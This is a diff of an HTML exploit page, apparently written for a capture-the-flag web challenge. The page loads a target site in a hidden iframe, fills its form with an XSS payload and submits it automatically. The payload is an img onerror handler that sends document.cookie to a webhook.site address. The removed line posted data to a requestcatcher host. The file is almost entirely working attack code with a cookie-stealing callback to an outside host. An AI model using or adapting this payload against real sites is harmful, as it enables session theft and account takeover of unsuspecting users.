@@ -1,1 +1,34 @@
-<!DOCTYPE html><html><body><script>fetch('https://singetu0096.requestcatcher.com/', {method: 'POST', body: "hello"});</script></body></html>
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Bot-like Input Submission</title>
+</head>
+<body>
+  <h1>Redirecting visitor to submit bot-like form...</h1>
+  <iframe id="victimFrame" src="http://34.146.134.179:3000/" style="display:none;"></iframe>
+
+  <script>
+    const FLAG = "FLAG{example_flag_here}";
+    const TEMPLATE = `<img src=x onerror="location.href='https://webhook.site/75ed9fca-03ae-4779-bffc-676dca5ad4e3?cookie=' + document.cookie">`;
+
+    const ANSWERS = "124567💪";
+
+    window.onload = () => {
+      const frame = document.getElementById('victimFrame');
+
+      frame.onload = () => {
+        try {
+          const doc = frame.contentWindow.document;
+          doc.getElementById('new-title').value = FLAG;
+          doc.getElementById('new-template').value = TEMPLATE;
+          doc.getElementById('new-answers').value = ANSWERS;
+          doc.getElementById('new-button').click();
+        } catch (e) {
+          console.error("Access denied or CSP prevented the injection:", e);
+        }
+      };
+    };
+  </script>
+</body>
+</html>
